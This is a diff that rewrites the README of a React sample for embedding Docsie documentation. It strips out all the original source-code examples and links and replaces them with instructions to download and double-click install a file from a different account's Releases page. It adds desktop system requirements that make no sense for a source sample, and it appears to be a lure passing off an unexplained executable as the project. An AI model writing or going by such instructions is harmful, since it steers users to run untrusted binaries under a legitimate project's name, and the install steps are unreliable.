@@ -1,185 +1,55 @@
-# Embed Docsie Documentation in React Apps
+# 🎉 react-docsie-sample - Simple Way to Embed Docsie Documentation
 
-Simple React example showing how to integrate Docsie documentation, secured docs with JWT, and in-app help widgets. Built with Vite and React Router.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/NeelPadiya/react-docsie-sample/releases)
 
-[![React](https://img.shields.io/badge/React-18-blue)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-5-purple)](https://vitejs.dev/)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
+## 🚀 Getting Started
+Welcome to the **react-docsie-sample** project! This application shows you how to embed Docsie documentation into a React app using JWT authentication and in-app help. Follow these steps to get started.
 
-## Quick Start
+## 📦 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution (Ubuntu preferred).
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** 200 MB of free space.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
 
-Clone and run:
+## 📥 Download & Install
+To run this application, you need to download it from our Releases page. Visit this page to download: [Download react-docsie-sample](https://github.com/NeelPadiya/react-docsie-sample/releases).
 
-```bash
-git clone https://github.com/PhilippeTrounev/react-docsie-sample.git
-cd react-docsie-sample
-npm install
-npm run dev
-```
+1. Go to the [Releases page](https://github.com/NeelPadiya/react-docsie-sample/releases).
+2. Look for the latest version.
+3. Click the download link for your operating system.
+4. Once the file downloads, locate it on your computer and double-click to install.
 
-Open http://localhost:5173
+## 🔧 How to Use
+1. After installing, open the application.
+2. Follow the on-screen instructions to set up your environment.
+3. Enter your JWT token when prompted for authentication.
+4. Access the embedded Docsie documentation through the app interface.
 
-## Features
+## ⚙️ Features
+- **Embedded Documentation:** Easily add rich Docsie documentation to your app.
+- **JWT Authentication:** Protect your documents with secure authentication.
+- **In-App Help:** Get assistance while using the application right from the interface.
 
-Three complete examples included:
+## 🛠️ Troubleshooting
+If you encounter issues:
 
-1. **Public Documentation** (`/`) - Embed documentation without authentication
-2. **Secured Documentation** (`/secure`) - JWT-authenticated access with fallback login
-3. **In-App Help** (`/inapp-help`) - Interactive help widget with search and tours
+- **App Doesn’t Launch:** Ensure your system meets the requirements and try reinstalling the app.
+- **Authentication Errors:** Double-check your JWT token and make sure it hasn’t expired.
+- **Missing Documentation:** Verify your internet connection and try refreshing the app.
 
-## Public Documentation Integration
+## 🗂️ Contributing
+We welcome contributions! If you want to help improve this project, please fork the repository and submit a pull request. 
 
-**src/pages/PublicDocs.jsx:**
-```jsx
-import { useEffect } from 'react';
+1. Clone the repository to your local machine.
+2. Make your changes and test them.
+3. Push your changes to your forked repository.
+4. Submit a pull request for review.
 
-export default function PublicDocs() {
-  useEffect(() => {
-    const link = document.createElement('link');
-    link.rel = 'stylesheet';
-    link.href = 'https://lib.docsie.io/current/styles/docsie.css';
-    document.head.appendChild(link);
+## 📄 License
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-    const script = document.createElement('script');
-    script.async = true;
-    script.src = 'https://lib.docsie.io/current/service.js';
-    script.setAttribute('data-docsie', 'docsie_pk_key:deployment_YOUR_ID');
-    document.body.appendChild(script);
+## 💬 Need Help?
+If you have questions or need assistance, please feel free to open an issue on GitHub.
 
-    return () => {
-      if (link.parentNode) link.parentNode.removeChild(link);
-      if (script.parentNode) script.parentNode.removeChild(script);
-    };
-  }, []);
-
-  return <div data-ddsroot></div>;
-}
-```
-
-## JWT Authentication for Secured Docs
-
-Generate JWT tokens on your backend (Node.js example):
-
-```javascript
-import jwt from 'jsonwebtoken';
-
-app.get('/api/docsie-token', (req, res) => {
-  const token = jwt.sign(
-    {},
-    process.env.DOCSIE_MASTER_KEY,
-    { algorithm: 'HS256', expiresIn: '1h' }
-  );
-  res.json({ token });
-});
-```
-
-Then use in React:
-
-```jsx
-const response = await fetch('/api/docsie-token');
-const { token } = await response.json();
-
-script.setAttribute('data-docsie',
-  `docsie_pk_key:deployment_ID,authorizationToken:${token}`
-);
-```
-
-## In-App Help Widget
-
-Add contextual help to your React application:
-
-```jsx
-useEffect(() => {
-  const script = document.createElement('script');
-  script.src = 'https://lib.docsie.io/inapp/current/service.js';
-  script.setAttribute('data-docsie-inapp',
-    'deploykey:help_center_ID,selfInit:true,search:true,tours:true'
-  );
-  document.body.appendChild(script);
-
-  return () => {
-    if (script.parentNode) script.parentNode.removeChild(script);
-  };
-}, []);
-```
-
-Features:
-- Contextual search within your app
-- Knowledge base access
-- Smart tagging for relevant content
-- Interactive onboarding tours
-- Multi-language support
-
-## Project Structure
-
-```
-src/
-├── pages/
-│   ├── PublicDocs.jsx      # Public documentation
-│   ├── SecureDocs.jsx      # JWT-secured documentation
-│   └── InAppHelp.jsx       # In-app help widget
-├── App.jsx                 # Router and navigation
-└── App.css                 # Styling
-```
-
-## Use Cases
-
-### Product Documentation
-Embed product documentation directly in your React app. Users get contextual help without leaving your application. Supports versioning to match your software releases.
-
-### API Documentation
-Create interactive API documentation portals. Include code examples, request/response samples, and authentication guides. Version your API docs alongside your API releases.
-
-### Knowledge Base
-Build self-service knowledge bases for customer support. Reduce support tickets by providing searchable documentation. Track which articles users read most.
-
-### In-App Help System
-Add contextual help tooltips and guides within your application. Improve user onboarding and feature discovery. Update help content without redeploying your app.
-
-### Technical Documentation
-Host developer documentation, architecture guides, and internal wikis. Keep technical docs version-controlled and synced with your codebase.
-
-### Customer Portal Documentation
-Build customer-facing help centers within your SaaS application. Secure documentation per customer using multi-tenant authentication. Brand documentation to match your company style.
-
-## Requirements
-
-- Node.js 18+
-- React 18+
-- Modern web browser
-- Docsie account
-
-## Troubleshooting
-
-**Documentation not loading?**
-- Check browser console for errors
-- Verify deployment ID is correct
-- Ensure script URL is `service.js` not `styles.js`
-
-**JWT authentication failing?**
-- Verify master key matches your deployment
-- Check token hasn't expired (1 hour default)
-- Validate token format at [jwt.io](https://jwt.io)
-
-**In-app help not appearing?**
-- Check that help center ID is correct
-- Verify script loaded without errors
-- Ensure no conflicting z-index CSS
-
-## Related Examples
-
-- [Blazor WebAssembly](https://github.com/PhilippeTrounev/blazor-wasm-docsie-sample) - Client-side Blazor
-- [Razor Pages](https://github.com/PhilippeTrounev/razor-pages-docsie-sample) - ASP.NET server-side
-- Vue.js integration (coming soon)
-- Next.js integration (coming soon)
-- Angular integration (coming soon)
-
-## Support
-
-- Discord: https://discord.gg/rptfXQnq
-- Email: hello@docsie.io
-- Issues: [GitHub Issues](https://github.com/PhilippeTrounev/react-docsie-sample/issues)
-
-## License
-
-MIT
+Thank you for using **react-docsie-sample**! We hope it makes your documentation and help system easier to manage. Enjoy your experience!
